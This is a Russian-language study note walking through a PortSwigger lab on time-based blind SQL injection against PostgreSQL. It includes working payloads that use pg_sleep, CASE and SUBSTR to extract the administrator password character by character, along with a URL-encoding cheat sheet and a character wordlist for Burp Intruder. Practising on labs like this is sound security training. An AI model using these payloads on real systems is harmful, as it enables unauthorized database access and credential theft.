# Blind SQL injection vulnerabilities
# *СЛЕПЫЕ SQLi  (5/7 лаба в этой теме)

# Lab: Blind SQL injection with time delays and information retrieval  = временная задержка + получение информации!
https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval


условия

The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind SQL injection vulnerability to find out the password of the `administrator`user.

To solve the lab, log in as the `administrator` user.

есть таблица users + колонки username и password  и аккаунт administrator
и нужно достать пароль и залогиниттся!

начинаю:

план: 
1) найти место с time sqli и определить бд
2) узнать есть ли таблица юзер
3) есть ли в ней колонка `username` and `password`
4) угадывать побуквенно пароль используя case + intruder burp
5) логирнуться

==действие:==
1) проверяю все места на time based
в куки параметр подставил 
'||(SELECT COUNT(*) FROM generate_series(1,10000000))--
и
'||(SELECT COUNT(*) FROM generate_series(1,30000000))--
и
'||(SELECT COUNT(*) FROM generate_series(1,100))--

работает конкатенация через `||`

и подтвердилось что запрос влияет на время ответа! 
==POSTGER SQL==

2)   есть ли таблица юзер ?
буду использовать case

' || (SELECT CASE WHEN EXISTS (SELECT 1 FROM information_schema.tables WHERE table_name='users') THEN pg_sleep(10) ELSE pg_sleep(0) END)--
сработало - значит таблица есть такая!

3) есть ли в ней колонка `username` and `password` ?


'|| (select case when exists(select 1 from users where username='administrator') then pg_sleep(5) else pg_sleep(0) end)--

сработало! значит есть такая учетная запись!

4) узнать пароль побуквенно!

'|| (select case when exists(select 1 from users where password='a' where username='administrator') then pg_sleep(5) else pg_sleep(0) end)--   
ОШИБКА! ==два where нельзя нужно заменить второе where на AND==

' || (SELECT CASE WHEN EXISTS(SELECT 1 FROM users WHERE password='a' AND username='administrator') THEN pg_sleep(5) ELSE pg_sleep(0) END)--
==ЭТО ПРОСТО ПРОВЕРКА ЧТО ПАРОЛЬ = "a"

SUBSTR(password,1,1)     вернет нужную букву / 
в некот бд ==SUBSTR== тоже что ==SUBSTRING== 


' || (SELECT CASE WHEN EXISTS(SELECT 1 FROM users WHERE SUBSTR(password,1,1)='a' AND username='administrator') THEN pg_sleep(5) ELSE pg_sleep(0) END)--

пароль: mssys394vg2g7c4dfrtv

ВЫПОЛНЕНО!!

на 21 несущ букву сработал пейлоад пробела 

итого: нужно потренироваться в sql запросах но по смыслу все предельно ясно!
ниже пейлоад: латин алфавит нижнестроч + цифры

- `%20` или `+` = пробел
    
- `%27` = `'` (апостроф)
    
- `%22` = `"` (двойная кавычка)
    
- `%3B` = `;` (точка с запятой)
    
- `%2D%2D` = `--` (два дефиса, комментарий)
    
- `%25` = `%` (знак процента)
    
- `%3D` = `=` (знак равенства)


a
b
c
d
e
f
g
h
i
j
k
l
m
n
o
p
q
r
s
t
u
v
w
x
y
z
1
2
3
4
5
6
7
8
9
0